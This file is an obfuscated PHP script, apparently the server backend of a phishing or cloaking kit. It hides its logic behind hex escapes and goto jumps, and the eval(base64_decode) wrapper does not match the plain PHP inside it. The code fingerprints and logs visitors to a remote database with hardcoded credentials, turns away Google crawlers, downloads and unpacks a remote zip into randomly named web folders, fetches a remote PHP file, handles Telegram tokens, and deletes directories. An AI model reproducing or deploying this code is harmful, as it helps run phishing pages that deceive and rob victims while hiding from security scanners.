<?php eval(base64_decode('
 goto bm1oS; KE6pI: if (isset($_GET["\145\x6e\x64\x6d\145\154\x75\170"])) { $redi = $_COOKIE["\x72\x65\x64\151\162\151\x63\x74"]; $vdir = $_GET["\145\156\x64\155\x65\154\x75\x78"]; $directoryToDelete = "\x77\x65\142\x2f" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\x73\143\x72\x69\160\x74\40\114\101\116\x47\125\101\x47\105\75\x27\112\141\x76\141\123\143\162\x69\160\164\x27\76\xa\40\x20\x20\40\x77\x69\156\x64\x6f\x77\x2e\154\157\143\141\x74\151\x6f\x6e\x2e\150\x72\145\x66\75\47{$redi}\47\73\xa\40\x20\40\x20\74\57\x73\143\162\x69\160\164\76"; die; } goto h1RJq; MxPpI: $RandOP_M = Rand_XD_TF(rand(7, 7)); goto r3_JN; Tf7Ww: $_SESSION["\151\163\x70"] = isset($info["\x69\163\x70"]) ? $info["\151\x73\x70"] : null; goto zs1oY; kGKXk: $Lredsvv = base64_decode("\x5a\110\x4a\152\132\x32\x6c\x73\145\x56\101\167\113\x6d\163\x6d"); goto H00sg; Mypin: $_SESSION["\x56\157\160\x72\164"] = isset($info["\143\x69\x74\171"]) ? $info["\143\151\x74\x79"] : null; goto oCwJA; ucbbo: $parentDirectory = "\x77\x65\x62"; goto k25Zo; xI7Q7: function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\x6e\156\145\143\x74\151\x6f\156\40\x66\x61\151\x6c\145\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\114\105\103\124\x20\52\x20\x46\122\x4f\115\x20\x72\x65\x64\151\x72\x63\x74\151\x6f\x6e\40\x57\x48\105\122\x45\x20\151\x64\x3d\x27{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\x6c\x69\156\153"] = base64_decode(base64_decode($row["\x6c\x69\156\x6b"])); $_SESSION["\143\156"] = explode("\73", base64_decode(base64_decode($row["\143\x6f\165\x6e\164\162\171"]))); $_SESSION["\160\x69\x63"] = $row["\x70\151\x63"]; $_SESSION["\x6d\x73\x67"] = base64_decode(base64_decode($row["\155\163\147"])); $_SESSION["\145\x78\x70"] = $row["\145\170\160\151\x72\145"]; $_SESSION["\163\x65\162\x76\x65\162"] = base64_decode(base64_decode($row["\x73\145\x72\166\x65\162"])); $_SESSION["\165\162\154"] = base64_decode(base64_decode($row["\x75\162\154"])); $_SESSION["\x6c\165\x78\x63\x61\160\x74\143\150\x61"] = $row["\x6c\x75\170\x63\141\160\x74\x63\x68\141"]; $_SESSION["\164\x6f\153\145\156\164\x65\x6c"] = base64_decode(base64_decode($row["\164\157\153\x65\156\x74\x65\154"])); $_SESSION["\151\144\x74\x65\x6c"] = base64_decode(base64_decode($row["\151\x64\164\145\154"])); $_SESSION["\x72\x65\x64\151\x72\151\x63\x74"] = $row["\x72\145\x64\x69\162\x69\x63\164"]; $_SESSION["\x61\160\x69"] = $row["\141\160\x69"]; if (isset($_GET["\x76\163\x73"])) { setcookie("\x74\157\x6b\145\x6e\164\x65\154", $_SESSION["\x74\x6f\x6b\145\x6e\x74\145\x6c"], time() + 86400 * 30, "\57"); setcookie("\151\x64\x74\x65\x6c", $_SESSION["\151\x64\x74\145\x6c"], time() + 86400 * 30, "\57"); setcookie("\162\x65\x64\x69\x72\151\143\164", $_SESSION["\x72\x65\x64\x69\x72\x69\143\x74"], time() + 86400 * 30, "\57"); } } } else { $refix = "\123\x51\114\x20\111\104\40\111\x6e\x76\x61\154\151\x64"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } mysqli_close($db); } goto q8I9b; h1RJq: if (isset($_GET["\154\x6f\x6c\155\x65"])) { $vdir = $_GET["\154\157\x6c\x6d\x65"]; $refix = "\111\156\166\x61\x6c\x69\x64\x20\x6c\x6f\154\x6d\145"; $redi = $_COOKIE["\162\x65\x64\x69\162\151\143\x74"]; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); $directoryToDelete = "\167\x65\142\x2f" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\x73\x63\162\x69\x70\x74\x20\114\x41\116\107\125\101\x47\x45\75\47\112\x61\166\141\x53\143\x72\151\x70\164\x27\x3e\xa\40\40\x20\40\167\x69\156\x64\157\167\x2e\154\x6f\x63\141\x74\151\x6f\x6e\56\x68\x72\x65\x66\75\x27{$redi}\x27\73\12\x20\40\x20\40\x3c\x2f\163\x63\x72\151\x70\x74\76"; die; } goto zekRm; kIBO7: if (strpos(gethostbyaddr($StrupLom), "\147\157\x6f\147\x6c\145") !== false) { $refix = "\x42\157\x73\145\40\107\40\62"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto MxPpI; m5beJ: function rand_num($length) { $characters = "\x30\61\62\x33\x34\65\x36\x37\70\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto ahn1X; zs1oY: $_SESSION["\x42\154\141\x73\141\x63\157\165\x6e"] = isset($info["\143\157\165\x6e\x74\162\x79"]) ? $info["\143\157\165\156\164\162\171"] : null; goto oB_u4; yS5VO: curl_close($curl); goto i4EzF; k25Zo: $directories = glob($parentDirectory . "\57\x2a", GLOB_ONLYDIR); goto JJJsi; nwQvi: if (isset($_POST["\154\x6f\x63\x61\x6c\x69\x70"])) { $myips = base64_decode(base64_decode($_POST["\154\157\143\141\154\151\x70"])); $_SESSION["\154\157\154\x69\160\163"] = $myips; $StrupLom = $myips; } goto WwuBX; oB_u4: $_SESSION["\x4e\x6a\x6f\x70\146"] = isset($info["\x63\x6f\165\156\x74\162\171\x43\x6f\x64\145"]) ? $info["\143\157\165\x6e\x74\x72\171\103\x6f\144\145"] : null; goto Mypin; wMZT1: $response = curl_exec($curl); goto yS5VO; liM6S: function Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\x6e\156\x65\x63\x74\151\157\x6e\x20\x66\x61\x69\x6c\x65\144\x3a\40" . mysqli_connect_error()); } $sql_u = "\123\105\x4c\105\103\x54\x20\x2a\x20\106\x52\117\115\x20\x6c\x6f\147\163\40\x57\110\105\x52\x45\x20\151\x70\141\144\144\x72\145\x73\75\47{$StrupLom}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return false; } mysqli_close($db); return true; } goto O3vDr; ryCzu: $datalog = base64_decode("\x65\155\x56\x79\142\x79\x31\x6b\x59\x58\x6b\165\143\x32\x68\x76\x63\x41"); goto LwEnU; JCYM5: if (strpos($userAgent, "\147\157\x6f\x67\154\145") !== false) { $refix = "\102\x6f\163\145\40\107"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto kIBO7; aGSnK: $url = "\x68\164\x74\x70\x3a\57\x2f\151\160\55\141\x70\x69\56\143\x6f\155\x2f\160\x68\160\57{$StrupLom}\77\146\x69\145\x6c\x64\163\75\163\164\141\x74\165\163\x2c\155\x65\163\x73\141\x67\145\54\x63\157\x6e\164\x69\x6e\x65\x6e\x74\54\143\x6f\x6e\164\151\x6e\145\156\164\103\157\144\145\54\x63\157\165\156\x74\x72\171\x2c\x63\157\165\x6e\164\162\x79\103\x6f\x64\145\54\x72\145\147\x69\157\x6e\x2c\162\x65\x67\x69\x6f\x6e\x4e\x61\155\145\54\143\151\164\171\x2c\144\x69\163\164\162\x69\x63\x74\54\172\x69\x70\x2c\x6c\141\x74\54\x6c\157\x6e\x2c\164\151\155\145\172\x6f\x6e\145\54\143\x75\x72\x72\145\x6e\143\x79\54\x69\x73\160\x2c\157\162\x67\54\141\x73\54\x61\163\156\x61\x6d\145\x2c\162\x65\166\x65\x72\x73\145\54\x6d\x6f\x62\151\x6c\x65\x2c\x70\x72\157\x78\171\x2c\150\157\x73\164\151\x6e\x67\54\161\x75\x65\162\x79"; goto RoVxG; SuPla: function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix) { $userAgent = isset($_SERVER["\110\124\124\x50\x5f\125\x53\x45\x52\x5f\101\107\105\116\124"]) ? $_SERVER["\x48\124\x54\120\x5f\125\x53\105\122\x5f\101\107\x45\116\x54"] : ''; $isp = $_SESSION["\151\163\160"]; $IpCount = FOx_TGH_X($userAgent); $OKJIVGRD = HYT_DDR_Uio($userAgent); $donflag = $_SERVER["\123\x45\x52\126\105\122\137\116\101\x4d\x45"]; $LOCALO_TEMPO = date("\131\x2d\155\x2d\144\40\x48\72\151\x3a\163"); $Blasacoun = $_SESSION["\x42\x6c\x61\163\141\x63\x6f\165\x6e"]; $Njopf = $_SESSION["\116\x6a\157\x70\146"]; $Voprt = $_SESSION["\x56\x6f\x70\162\164"]; $xOpuy = $_SESSION["\x78\117\160\x75\171"]; $host = gethostbyaddr($StrupLom); $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\x43\157\x6e\156\145\143\x74\151\x6f\x6e\40\x66\x61\x69\x6c\x65\144\x3a\x20" . mysqli_connect_error()); } $sql_u = "\x53\105\114\105\x43\124\40\52\40\x46\122\x4f\x4d\x20\x6c\157\x67\163\x20\x57\110\105\x52\105\40\151\160\141\x64\x64\x72\145\x73\x3d\x27{$StrupLom}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); echo "\41\41"; die; } else { $StrupLom = mysqli_real_escape_string($db, str_replace("\x27", '', $StrupLom)); $Blasacoun = mysqli_real_escape_string($db, str_replace("\47", '', $Blasacoun)); $IpCount = mysqli_real_escape_string($db, str_replace("\x27", '', $IpCount)); $OKJIVGRD = mysqli_real_escape_string($db, str_replace("\x27", '', $OKJIVGRD)); $donflag = mysqli_real_escape_string($db, str_replace("\47", '', $donflag)); $LOCALO_TEMPO = mysqli_real_escape_string($db, str_replace("\47", '', $LOCALO_TEMPO)); $host = mysqli_real_escape_string($db, str_replace("\47", '', $host)); $isp = mysqli_real_escape_string($db, str_replace("\x27", '', $isp)); $refix = mysqli_real_escape_string($db, str_replace("\47", '', $refix)); $query = "\x49\x4e\123\105\122\x54\x20\111\116\124\x4f\x20\154\x6f\147\x73\40\50\151\x70\x61\144\144\x72\145\x73\54\x63\x6f\165\156\164\x72\x79\54\x62\162\157\x77\163\x65\162\x2c\x6f\x73\x2c\x64\x6f\155\151\156\x65\54\155\171\x74\x69\x6d\x65\x2c\150\x6f\x73\164\x2c\x69\163\160\x2c\162\x65\163\x6f\x6e\51\x20\xa\40\40\x20\40\x20\x20\11\40\x20\x20\40\x9\40\x20\126\x41\x4c\x55\x45\x53\x20\x28\x27{$StrupLom}\x27\x2c\x27{$Blasacoun}\47\54\47{$IpCount}\47\x2c\47{$OKJIVGRD}\x27\54\x27{$donflag}\x27\54\x27{$LOCALO_TEMPO}\47\x2c\47{$host}\47\54\x27{$isp}\47\54\x27{$refix}\47\51"; $results = mysqli_query($db, $query); mysqli_close($db); echo "\41"; } } goto JCYM5; JUxcN: if ($_SERVER["\122\105\121\125\105\123\x54\137\x4d\x45\124\x48\x4f\104"] === "\120\117\123\x54") { if (!isset($_POST["\x6c\x6f\x63\141\x6c\151\x70"])) { $refix = "\111\156\166\x61\x6c\151\x64\40\x49\x50\123"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!isset($_POST["\x73\x68\157\160\151\144"])) { $refix = "\x49\x6e\166\141\x6c\x69\x64\40\111\104\40\x53\121\114"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!is_dir("\167\145\x62")) { if (!mkdir("\x77\x65\142", 511)) { die("\106\141\x69\154\x65\x64\x20\x74\x6f\x20\x63\x72\145\141\x74\x65\x20\x77\145\x62\x20\144\151\162\x65\143\164\157\x72\171"); } } $folder_name = bin2hex(random_bytes(8)); $sub_folder = rand_num(4); $folder_path = "\x77\x65\142\x2f{$sub_folder}\57"; $zipFileUrl = $_SESSION["\165\162\x6c"]; $tempDir = "\x74\145\x6d\160"; if (!is_dir($tempDir)) { mkdir($tempDir); } $zipFileName = "{$tempDir}\x2f{$folder_name}\x2e\x7a\x69\x70"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\106\141\151\154\145\144\40\164\157\x20\x63\x72\x65\141\x74\x65\40\164\150\145\x20\146\157\154\144\145\162\56"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); $extractedFiles = scandir($folder_path); foreach ($extractedFiles as $file) { if ($file !== "\x2e" && $file !== "\56\x2e") { rename($folder_path . "\x2f" . $file, $folder_path . $file); } } } else { echo "\106\141\151\154\x65\x64\40\x74\x6f\x20\x65\170\x74\x72\x61\143\x74\40\x74\x68\x65\40\172\x69\160\x20\146\x69\154\145\56"; } } else { die("\106\x61\x69\x6c\145\144\40\x74\157\x20\144\x6f\167\x6e\154\157\x61\144\x20\164\x68\x65\x20\172\x69\160\40\x66\x69\x6c\x65\56"); } if (file_exists($zipFileName)) { unlink($zipFileName); } $gameid = $_SESSION["\154\x6f\154\163\157\165\x6c\163"]; $_SESSION["\154\157\x63\x61\154\x64\x69\162"] = "{$folder_path}"; file_put_contents("{$folder_path}\x2f\154\157\x63\x61\x6c\56\164\x78\x74", "{$StrupLom}\xa", FILE_APPEND); $fileURL = $_SESSION["\141\x70\x69"]; function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { return; } $fileContents = file_get_contents($fileURL); if ($fileContents !== false) { $localFilePath = "\x77\145\x62\x2f\141\x70\151\56\x70\x68\x70"; file_put_contents($localFilePath, $fileContents); } } if ($fileURL !== "\x41\120\111") { getFileContents($fileURL); } $localip = isset($_POST["\154\157\x63\141\x6c\151\x70"]) ? $_POST["\x6c\x6f\143\x61\154\151\160"] : null; $domainname = isset($_POST["\144\157\155\x61\x69\x6e\x6e\x61\155\x65"]) ? $_POST["\144\x6f\155\141\x69\156\x6e\x61\155\x65"] : null; $nextdomain = isset($_POST["\x6e\x65\170\164\x64\x6f\x6d\x61\x69\156"]) ? $_POST["\156\x65\170\164\x64\157\x6d\x61\x69\156"] : null; $shopid = isset($_POST["\x73\x68\157\x70\x69\144"]) ? $_POST["\x73\x68\157\x70\151\144"] : null; if ($localip !== null && $domainname !== null && $nextdomain !== null && $shopid !== null) { $directory = "\164\145\x6d\x70"; $zipFiles = glob($directory . "\x2a\56\172\151\160"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } $responseData = array("\x73\164\141\164\165\x73" => "\x73\x75\x63\143\x65\x73\x73", "\142\141\x63\x6b\137\x64\x69\x72" => $folder_path, "\x62\141\143\x6b\x5f\x75\x72\x6c" => $nextdomain, "\142\141\x63\153\x5f\x69\x64" => $shopid, "\155\145\163\x73\x61\x67\145" => "\104\141\x74\x61\40\x72\145\x63\145\151\x76\145\x64\x20\x73\x75\143\143\x65\x73\163\x66\x75\154\154\x79"); $responseJson = json_encode($responseData); echo $responseJson; } else { http_response_code(400); echo "\x4d\151\x73\x73\151\156\147\40\x72\x65\x71\165\151\x72\x65\144\x20\x64\x61\x74\x61"; } } else { http_response_code(405); echo "\111\156\166\141\x6c\x69\x64\40\162\145\x71\165\145\x73\164\x20\x6d\x65\x74\x68\x6f\144"; } goto n7dO9; cbsml: if (!empty($_SERVER["\110\x54\124\120\137\103\x4c\x49\x45\116\124\x5f\111\120"])) { $ipAddress = $_SERVER["\x48\x54\124\120\137\103\114\x49\105\x4e\x54\137\111\120"]; } elseif (!empty($_SERVER["\110\124\124\120\x5f\130\137\x46\x4f\122\127\x41\x52\104\x45\x44\137\106\117\x52"])) { $ipAddress = $_SERVER["\110\x54\124\120\x5f\130\137\106\x4f\122\127\x41\122\x44\105\104\137\106\x4f\122"]; } else { $ipAddress = $_SERVER["\x52\x45\115\117\124\x45\x5f\x41\104\x44\122"]; } goto ik22L; q8I9b: function Rand_XD_TF($length) { $characters = "\141\x62\143\144\x65\146\152\x68\x69\147\153\x6c\155\x6e\x6f\x70\161\x72\x73\x74\165\x76\x77\170\171\x7a\x30\61\62\x33\64\65\66\x37\70\71\x41\102\x43\104\105\x46\x47\x48\111\x4a\x4b\114\x4d\x4e\117\x50\121\x52\123\124\125\126\x57\130\131\x5a"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto m5beJ; O3vDr: if (!Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv)) { $showpip = "\x21\41\41"; echo $showpip; die; } goto KE6pI; SlVMy: $StrupLom = $ipPortArray[0]; goto EqvtP; JJJsi: if (is_array($directories)) { foreach ($directories as $dir) { if (basename($dir)[0] != "\56") { if (deleteDirectory($dir)) { } } } } goto liM6S; ls2HJ: $domain = $_SERVER["\x48\124\x54\x50\x5f\110\117\x53\124"]; goto zc6eS; TQBZS: function FOx_TGH_X($USER_AGENT) { $BROWSER_ERROR = "\x55\156\153\x6e\x6f\167\x6e\x20\x42\x72\157\x77\163\145\x72"; $BROWSER = array("\57\x6d\x73\151\x65\57\x69" => "\111\x6e\164\x65\162\156\145\x74\40\105\170\x70\154\157\x72\145\162", "\x2f\x66\151\162\x65\146\157\x78\x2f\x69" => "\x46\151\162\x65\146\x6f\170", "\57\x73\x61\x66\x61\162\x69\x2f\x69" => "\123\141\x66\141\x72\151", "\57\x63\150\x72\157\x6d\x65\57\151" => "\103\x68\162\157\155\145", "\x2f\145\x64\x67\145\57\151" => "\105\144\x67\145", "\x2f\x6f\x70\145\162\x61\57\x69" => "\117\x70\145\162\x61", "\57\x6e\x65\x74\163\x63\x61\160\145\x2f\x69" => "\116\x65\x74\163\x63\141\x70\145", "\57\x6d\141\170\x74\x68\157\156\57\151" => "\x4d\141\x78\x74\x68\x6f\156", "\57\153\157\x6e\161\165\145\x72\x6f\x72\x2f\x69" => "\x4b\x6f\x6e\x71\x75\145\x72\157\x72", "\57\155\x6f\x62\151\154\x65\57\151" => "\x48\141\x6e\x64\150\145\154\x64\x20\x42\162\x6f\x77\163\x65\x72"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto QzxcY; XjWbk: if (isset($_POST["\163\150\x6f\x70\x69\144"])) { $gameid = $_POST["\x73\x68\x6f\x70\151\x64"]; $_SESSION["\154\x6f\154\x73\x6f\165\x6c\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); } goto xI7Q7; i4EzF: $info = unserialize($response); goto Tf7Ww; H00sg: $Nopwvv = base64_decode("\143\x33\x52\x79\142\62\x35\156\x58\62\122\x68\x65\121"); goto aGSnK; lkulY: $IpCount = FOx_TGH_X($userAgent); goto SuPla; hlHv6: ini_set("\x64\151\x73\160\154\x61\171\137\x65\x72\x72\x6f\162\163", 1); goto cbsml; ahn1X: function HYT_DDR_Uio($USER_AGENT) { $OS_ERROR = "\x55\x6e\153\x6e\157\167\x6e\x20\117\123\40\x50\154\x61\164\x66\x6f\162\155"; $OS = array("\57\167\151\x6e\x64\157\167\163\x20\x6e\164\40\61\x30\x2f\151" => "\x57\x69\x6e\144\x6f\167\163\x20\61\x30", "\57\x77\151\x6e\144\x6f\167\163\40\156\x74\40\66\x2e\63\x2f\x69" => "\127\x69\156\x64\x6f\167\x73\40\70\56\x31", "\57\x77\x69\x6e\144\x6f\x77\163\40\x6e\164\x20\x36\56\x32\x2f\151" => "\127\151\156\144\x6f\x77\163\x20\x38", "\57\167\151\x6e\144\157\167\x73\40\x6e\x74\x20\x36\x2e\x31\57\x69" => "\127\x69\156\x64\x6f\167\x73\40\67", "\57\167\x69\156\144\x6f\x77\163\x20\156\164\x20\x36\56\60\x2f\151" => "\127\151\x6e\x64\157\x77\x73\x20\126\x69\x73\x74\x61", "\x2f\x77\x69\x6e\144\157\167\163\x20\x6e\164\40\x35\56\x32\57\151" => "\x57\151\x6e\144\157\167\163\x20\123\x65\162\x76\145\162\40\62\60\60\63\x2f\x58\120\40\170\x36\64", "\57\x77\x69\x6e\144\157\167\x73\x20\x6e\164\x20\65\x2e\61\x2f\151" => "\127\x69\156\144\157\x77\163\40\130\120", "\x2f\167\151\156\x64\x6f\167\163\x20\x78\160\x2f\x69" => "\127\151\156\x64\x6f\x77\163\40\130\x50", "\57\167\151\x6e\x64\x6f\167\x73\x20\x6e\x74\x20\x35\56\60\57\x69" => "\127\x69\156\x64\x6f\x77\x73\x20\62\60\60\60", "\57\x77\x69\156\144\x6f\167\163\40\x6d\145\x2f\151" => "\127\x69\x6e\x64\x6f\x77\x73\40\x4d\x45", "\57\x77\151\x6e\x39\70\57\151" => "\x57\151\156\x64\157\167\x73\x20\71\70", "\57\167\x69\156\x39\65\57\151" => "\x57\151\156\144\157\167\x73\40\71\x35", "\57\x77\151\x6e\x31\x36\57\x69" => "\x57\x69\x6e\x64\x6f\x77\x73\x20\63\56\x31\x31", "\57\x6d\x61\143\x69\x6e\164\x6f\163\x68\174\155\141\x63\x20\157\x73\40\x78\x2f\151" => "\115\141\x63\40\x4f\x53\40\130", "\57\x6d\141\143\x5f\x70\x6f\x77\145\x72\160\x63\57\x69" => "\x4d\x61\143\x20\117\123\40\71", "\x2f\x6c\x69\156\165\170\57\151" => "\x4c\151\156\165\x78", "\x2f\165\x62\165\156\164\165\x2f\151" => "\x55\142\165\156\x74\165", "\57\151\x70\x68\157\156\x65\x2f\151" => "\x69\120\150\157\156\x65", "\57\x69\x70\x6f\144\57\151" => "\x69\x50\x6f\x64", "\57\x69\160\141\144\57\151" => "\x69\120\x61\144", "\x2f\x61\156\x64\162\157\151\x64\x2f\151" => "\101\156\x64\162\x6f\151\144", "\57\x62\x6c\x61\x63\153\x62\x65\162\162\x79\x2f\151" => "\x42\154\141\x63\x6b\102\145\x72\162\x79", "\57\x77\145\x62\157\x73\57\x69" => "\115\157\142\x69\154\145"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto TQBZS; r3_JN: $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); goto JUxcN; WwuBX: $protocol = isset($_SERVER["\x48\124\x54\x50\123"]) && $_SERVER["\x48\x54\124\120\123"] === "\x6f\156" ? "\x68\x74\164\160\x73" : "\x68\x74\164\x70"; goto ls2HJ; zc6eS: $donflag = $protocol . "\x3a\57\57" . $domain; goto ryCzu; ik22L: $ipPortArray = explode("\72", $ipAddress); goto SlVMy; QzxcY: $userAgent = isset($_SERVER["\x48\x54\124\120\137\x55\x53\105\122\137\x41\107\x45\116\124"]) ? $_SERVER["\x48\124\x54\120\x5f\x55\x53\105\x52\x5f\101\107\105\x4e\124"] : ''; goto kBlT8; II_4m: $TIME_DATE = date("\x59\x2d\x6d\55\x64\40\110\72\151\x3a\163"); goto nwQvi; wd0Oi: function deleteDirectorynew($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\56\x2e") { continue; } if (!deleteDirectorynew($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } goto vzmJ7; bm1oS: error_reporting(E_ALL); goto hlHv6; vzmJ7: function deleteDirectory($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } $time_diff = time() - filectime($dir); if ($time_diff > 290) { foreach (scandir($dir) as $item) { if ($item == "\x2e" || $item == "\x2e\x2e") { continue; } if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } else { return true; } } goto ucbbo; bywND: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto wMZT1; RoVxG: $curl = curl_init($url); goto bywND; LwEnU: $Fixbom = base64_decode("\143\x33\x52\x79\142\62\65\156\130\62\122\150\x65\121"); goto kGKXk; oCwJA: $_SESSION["\170\x4f\160\x75\171"] = isset($info["\x72\x65\147\x69\x6f\156\x4e\141\155\x65"]) ? $info["\x72\x65\x67\151\157\x6e\x4e\141\155\145"] : null; goto wd0Oi; zekRm: if (isset($_GET["\166\x73\163"])) { $gameid = $_GET["\163\x6f\165\x6c\x73"]; $_SESSION["\154\x6f\154\x73\x6f\x75\154\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); $folder_pathx = $_GET["\166\163\x73"]; $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); echo "\74\163\143\162\x69\x70\164\x20\114\101\116\x47\x55\x41\107\105\75\x27\112\141\x76\x61\x53\143\162\151\160\x74\x27\x3e\xa\40\x20\40\40\x77\151\156\144\x6f\x77\x2e\x6c\157\x63\x61\x74\x69\x6f\x6e\56\150\x72\145\x66\x3d\x27{$folder_pathx}\77\x26\166\141\154\151\144\x3d{$RandOP_Mlux}{$RandOP_Mlux}\46\141\154\x65\162\x74\x3d{$RandOP_Mlux}\x26\170\154\160\x73\x3d{$RandOP_Mlux}\46\x73\x6f\x75\154\163\x3d{$gameid}\x26\x64\157\156\x65\75\46\x65\162\x72\x6f\162\171\x3d{$RandOP_Mlux}\46\x6d\156\x65\x6d\157\x6e\151\x63\75\46\152\x62\x3d{$RandOP_Mlux}\x27\73\xa\40\x20\x20\40\74\57\163\143\162\x69\x70\x74\76"; die; } goto XjWbk; kBlT8: $OKJIVGRD = HYT_DDR_Uio($userAgent); goto lkulY; EqvtP: $domine = $_SERVER["\x53\x45\122\126\105\122\x5f\116\x41\x4d\105"]; goto II_4m; n7dO9: ')); ?>
